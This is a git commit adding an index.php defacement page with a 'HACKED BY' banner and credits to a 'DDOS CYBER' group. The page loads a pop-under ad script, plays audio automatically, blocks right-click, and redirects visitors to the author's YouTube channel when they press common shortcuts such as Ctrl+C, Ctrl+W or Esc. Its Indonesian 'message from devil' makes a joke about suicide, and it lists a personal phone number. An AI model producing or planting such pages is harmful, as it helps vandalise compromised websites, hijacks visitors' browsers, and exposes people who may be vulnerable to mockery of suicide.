c0ae51ee99e01c3770cf7da30b794d7f47249277
ubaydillah <71566130+ubed354311@users.noreply.github.com>
2021-01-08 00:47:07 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,380 @@
+
+<html>
+<head>
+<meta property="og:description" content="`` terheked :) ``"/>	
+<meta property="og:image" content="https://j.top4top.io/p_1760s2dae0.jpg"/>
+<link rel="shortcut icon" href="https://f.top4top.io/p_1691sugh50.jpeg"/>
+<meta http-equiv="cache-control" content="index,cache">
+<meta http-equiv="pragma" content="public">
+<link rel="stylesheet" type="text/css" href="https://ia601501.us.archive.org/22/items/animated_201809/animated.css">
+<title>.::[ terheked :) ]::.</title>
+</head>
+<body>
+<strong>
+<script src="http://code.jquery.com/jquery-latest.js" type="text/javascript"></script>
+<center><br><p></p><blink><font face="monaco" size="15" font style="text-shadow: 0px 0px 30px red;" color="white">HACKED BY</font><font face="Orbitron" size="7" color="white" class="a"></font><br></blink><br></center>
+<center><img style="width:300;" src="https://d.top4top.io/p_18321p8o01.png" />
+<script src='http://misbahudin-dcaesga.googlecode.com/files/efek-salju.js'/><script>
+setInterval(function(){
+ $(".berkedip").toggle();
+},300);
+</script>
+<center>
+<b><style type="text/css">
+  #highlight{font:bold 50px Impact,Arial,Sans-Serif;}
+</style>
+<script language="javascript" type="text/javascript">
+     
+
+if (document.all||document.getElementById) {
+     document.write('<span id="highlight">' + teks + '</span>')
+     var storetext=document.getElementById? document.getElementById("highlight") :
+document.all.highlight
+} else document.write(text)
+var hex=new Array("00","14","28","3C","50","64","78","8C","A0","B4","C8","DC","F0")
+
+var r=1
+var g=1
+var b=1
+var seq=1
+
+function changetext() {
+     rainbow="#"+hex[r]+hex[g]+hex[b]
+     storetext.style.color=rainbow
+}
+
+function change() {
+if (seq==6) {
+b--
+if (b==0)
+seq=1
+}
+if (seq==5) {
+r++
+if (r==12)
+seq=6
+}
+if (seq==4) {
+g--
+if (g==0)
+seq=5
+}
+if (seq==3) {
+b++
+if (b==12)
+seq=4
+}
+if (seq==2) {
+r--
+if (r==0)
+seq=3
+}
+if (seq==1) {
+g++
+if (g==12)
+seq=2
+}
+changetext()
+}
+
+function starteffect() {
+     if (document.all||document.getElementById)
+     flash=setInterval("change()",speed)
+}
+
+starteffect()
+</script>
+<style>
+	.link-button{
+		text-decoration: none;
+		background-color: #eeeeee;
+		color: black;
+		padding: 2px 6px 2px 6px;
+		border: 1px solid #c2c2c2;
+		border-radius:2px;
+	}
+	</style>
+</b>
+<script type='text/javascript'>
+<script type="text/javascript">
+var uid = '154035';
+var wid = '328457';
+</script>
+<script type="text/javascript" src="//cdn.popcash.net/pop.js"></script>
+
+<style>
+	body{
+		text-align: center;
+		font-size: 20px;
+		font-family: verdana;
+	   background-image:url(https://i.gifer.com/V8E.gif);
+	   background-size:cover;
+	   background-attachment: fixed;
+	}
+
+</style>
+</script>
+<script> 
+
+TypingText = function(element, interval, cursor, finishedCallback) {
+
+if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+
+this.running = true; // Never run.
+
+return;
+
+}
+
+this.element = element;
+
+this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+
+this.interval = (typeof interval == "undefined" ? 100 : interval);
+
+this.origText = this.element.innerHTML;
+
+this.unparsedOrigText = this.origText;
+
+this.cursor = (cursor ? cursor : "");
+
+this.currentText = "";
+
+this.currentChar = 0;
+
+this.element.typingText = this;
+
+if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+
+TypingText.all.push(this);
+
+this.running = false;
+
+this.inTag = false;
+
+this.tagBuffer = "";
+
+this.inHTMLEntity = false;
+
+this.HTMLEntityBuffer = "";
+
+}
+
+TypingText.all = new Array();
+
+TypingText.currentIndex = 0;
+
+TypingText.runAll = function() {
+
+for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+
+}
+
+TypingText.prototype.run = function() {
+
+if(this.running) return;
+
+if(typeof this.origText == "undefined") {
+
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval); // We haven't finished loading yet. Have patience.
+
+return;
+
+}
+
+if(this.currentText == "") this.element.innerHTML = "";
+
+// this.origText = this.origText.replace(/<([^<])*>/, ""); // Strip HTML from text.
+
+if(this.currentChar < this.origText.length) {
+
+if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+
+this.tagBuffer = "<";
+
+this.inTag = true;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+
+this.tagBuffer += ">";
+
+this.inTag = false;
+
+this.currentText += this.tagBuffer;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.inTag) {
+
+this.tagBuffer += this.origText.charAt(this.currentChar);
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+
+this.HTMLEntityBuffer = "&";
+
+this.inHTMLEntity = true;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+
+this.HTMLEntityBuffer += ";";
+
+this.inHTMLEntity = false;
+
+this.currentText += this.HTMLEntityBuffer;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.inHTMLEntity) {
+
+this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else {
+
+this.currentText += this.origText.charAt(this.currentChar);
+
+}
+
+this.element.innerHTML = this.currentText;
+
+this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+
+this.currentChar++;
+
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+
+} else {
+
+this.currentText = "";
+
+this.currentChar = 0;
+
+this.running = false;
+
+this.finishedCallback();
+
+}
+
+}
+
+</script>
+
+<center><p id="info"><font face="monaco" size="5" font style="text-shadow: 0px 0px 30px red;" color="white">Message From Devil :<br></font>
+
+<font face="courier new" size="6" font style="text-shadow: 0px 0px 30px red;" color="white">Hanya dua hal yang bisa anda lakukan <br></font>
+<font face="courier new" size="5" font style="text-shadow: 0px 0px 30px red;" color="white">pada pohon di depan rumah anda<br>
+<font face="courier new" size="5" font style="text-shadow: 0px 0px 30px red;" color="white">Berayun atau bunuh diri<br>
+
+<a href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw" class="link-button"> MY YOUTUBE</a>
+<a href="https://vt.tiktok.com/ZSqSG8Dd/" class="link-button"> MY TIKTOK</a>
+<a href="https://wa.me/6281358195297/?text=ASSALAMU'ALAIKUM JANGAN LUPA  SHALAT 5 WAKTUNYA DI LAKSANAKAN YA :)" class="link-button">WHATSAPP ME</a>
+<center><audio autoplay="autoplay" controls="controls" src="https://d.top4top.io/m_183259zm60.mp3"></audio></a></center>
+<script type="text/javascript"> 
+
+//Define first typing example:
+
+//Define second typing example (use "slashing" cursor at the end):
+
+new TypingText(document.getElementById("info"), 150, function(i){
+
+var ar = new Array("_"," ","_","_"); return " " + ar[i.length %
+
+ar.length]; });
+
+//Type out examples:
+
+TypingText.runAll();
+
+</script></br>
+
+</script>
+<script language=JavaScript>
+<!--
+
+var message="Please Don't!";
+
+<script type="text/javascript"> //<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},
+shortcut.add("esc",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+Shift+Del",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+F",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+W",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+U",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+A",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+S",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+X",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+C",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+V",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+Y",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+shortcut.add("Ctrl+Z",function(){top.location.href="https://youtube.com/channel/UCwNrAxS3jFH9Sl_ah2oL7Pw"});
+//]]></script>
+
+///////////////////////////////////
+function clickIE4(){
+if (event.button==2){
+alert(message);
+return false;
+}
+}
+
+function clickNS4(e){
+if (document.layers||document.getElementById&&!document.all){
+if (e.which==2||e.which==3){
+alert(message);
+return false;
+}
+}
+}
+
+if (document.layers){
+document.captureEvents(Event.MOUSEDOWN);
+document.onmousedown=clickNS4;
+}
+else if (document.all&&!document.getElementById){
+document.onmousedown=clickIE4;
+}
+
+document.oncontextmenu=new Function("alert(message);return false")
+
+// -->
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="http://ryangueltoem.blogspot.com/"});
+//]]>
+</script>
+
+<footer id="det" style="position:fixed; left:0px; right:0px; bottom:0px; background:rgb(0,0,0); text-align:center; border-top: 1px solid #FFFFFF; border-bottom: 1px solid #FFFFFF"><font face="courier new" size="3" font style="text-shadow: 0px 0px 5px white;" color="white"><font color="white">THANKS TO :</b></font><marquee scrollamount="5" scrolldelay="50" width="80%"><b>ASEP DDOS CYBER | UBED DILLAH (MASTAH) | DIMZ ZX | ZXPHOENIX | TUANCKER | ZX TIM | ALL SUBSCRIBER AND MEMBER DDOS CYBER</b></marquee></font></footer>
+</body>
+</html>
